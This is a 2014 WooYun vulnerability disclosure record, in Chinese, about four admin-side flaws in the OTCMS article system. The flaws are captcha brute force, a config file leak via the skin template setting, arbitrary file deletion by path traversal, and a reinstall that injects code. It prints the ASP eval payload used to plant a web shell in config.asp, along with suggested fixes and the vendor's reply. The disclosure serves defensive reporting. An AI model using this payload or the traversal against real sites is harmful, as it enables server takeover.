{"id": 56475, "wybug_id": "wooyun-2014-057589", "wybug_title": "网钛文章管理系统后台多出漏洞可拿shell", "wybug_corp": "otcms.com", "wybug_author": "seraph1984", "wybug_date": "2014-04-18 21:32", "wybug_open_date": "2014-07-17 21:33", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["删除文件", "安装"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-17：\t细节向公众公开  简要描述： 网钛文章管理系统 V2.83 build 20140411，利用后台删除文件功能，删除安装锁，重新安装得到shell一共发现四个漏洞 详细说明：  漏洞1：后台验证码提交后不刷新利用：直接找到帐号，后台burp可以强破密码漏洞2：后台文件泄露漏洞利用：后台皮肤管理处修改一个模板样式文件为存在的asp为件如\n\n修改后更新，查看skin目录下的csshttp://localhost/skin/def_black/style7.css可以看到config.asp的源码了\n\n漏洞3：后台任意文件删除利用方法，删除安装锁文件，配合install没有删除的情况下可以getshell后台在删除文章时会同时删除文件内的附件和图片指定文件时，利用跳转目录的方法可以指定任意文件比较注意的是文件名前面加coll/../再跳，这个是程序特别设定的还有删除的时候要选择，再批量删除，不能对单个点删除\n\n漏洞4：安装文件getshell利用：漏洞3删除掉安装锁后，可以二次安装，安装时数据库名  \":eval request(\"#\"):a=\"1.mdb目录名 \":eval request(\"#\"):a=\"1备份名 \":eval request(\"#\"):a=\"2说实在的这个漏洞产生的很有意思，贴个代码看看\nisDatabaseName\t= File_RevName(dbPathPart & dbName,accName)\t\tIf isDatabaseName=False Then\t\t\talertNum = alertNum + 1\t\t\talertStr = alertStr & alertNum &\"、网站数据库名称重命名（新名称:\"& accName &\"）失败；<br />\"\t\t\t\twebDbName = Split(dbName,\"/\")(1)\t\tElse\t\t\tisDatabaseDir\t= File_RevDirName(dbPathPart & dbNameArr(0),accDir)\t\t\t\tIf isDatabaseDir=False Then\t\t\t\t\talertNum = alertNum + 1\t\t\t\t\talertStr = alertStr & alertNum &\"、数据库目录名重命名（新名称:\"& accDir &\"）失败；<br />\"\t\t\t\t\taccDir = Split(dbName,\"/\")(0)\t\t\t\tEnd If\t\t\t\tEnd If\tisBackupDir\t\t= File_RevDirName(dbPathPart & dbBackupDir,accBackupDir)\t\tIf isBackupDir=False Then\t\t\talertNum = alertNum + 1\t\t\talertStr = alertStr & alertNum &\"、数据库备份目录名重命名（新名称:\"& accBackupDir &\"）失败；<br />\"\t\t\twebBackupDir = dbBackupDir\t\tEnd If\tconfigContent = File_Read(server.mapPath(\"config2.4.OTtpl\"))\tconfigContent = Replace(configContent,\"{%SiteID%}\",webSiteID)\tconfigContent = Replace(configContent,\"{%DbDir%}\",accDir)\tconfigContent = Replace(configContent,\"{%BackupDir%}\",webBackupDir)\tconfigContent = Replace(configContent,\"{%DbName%}\",webDbName)\tconfigContent = Replace(configContent,\"{%SiteID%}\",webSiteID)\n这里面的逻辑有问题啊，本来他原来的意思是如果重命名失败，就还是原本的内容但是他这里面的accdir这个参数，一定要数据库改名正确了才会检测，就是利用accdir这个参数不被覆盖才得到的shell文件写到config.asp但不能访问要访问/users.asp 为shell搞了一个晚上才弄出来的，就为了一个邀请码，求通过啊   漏洞证明：  1   修复方案：  漏洞1  登录失败后验证码清空漏洞2 模板样式文件提交的时候过滤,只留下[a-zA-Z0-9\\.]漏洞3 同样的，过滤字符..\\漏洞4 逻辑错误 ，文件名改失败的时候 accir用原来的复盖   版权声明：转载请注明来源 seraph1984@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-04-19 15:55 厂商回复： 感谢 seraph1984 发些这些漏洞，并通过乌云平台及时通知我们修复。为表感谢，麻烦seraph1984联系我们网钛，我们网钛将送个小礼物给你。 最新状态： 2014-08-16：该漏洞已于网钛CMS V5.00版本修复了。  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}